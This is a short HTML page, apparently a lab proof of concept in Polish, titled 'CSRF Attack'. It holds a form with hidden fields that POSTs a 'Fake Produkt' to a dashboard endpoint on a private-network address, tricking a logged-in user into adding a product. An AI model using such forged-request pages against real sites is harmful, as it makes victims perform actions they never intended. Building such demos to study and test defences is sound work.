<!DOCTYPE html>
<html lang="pl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CSRF Attack</title>
  </head>
  <body>
    <h1>CSRF Attack</h1>
    <p>Kliknij aby dodac produkty bez wpisywania</p>
    <form
      id="csrfForm"
      action="http://192.168.56.1:5000/dashboard/produkty"
      method="POST"
    >
      <input type="hidden" name="nazwa" value="Fake Produkt" />
      <input type="hidden" name="cena" value="99.99" />
      <button type="submit">Dodaj produkt</button>
    </form>
  </body>
</html>
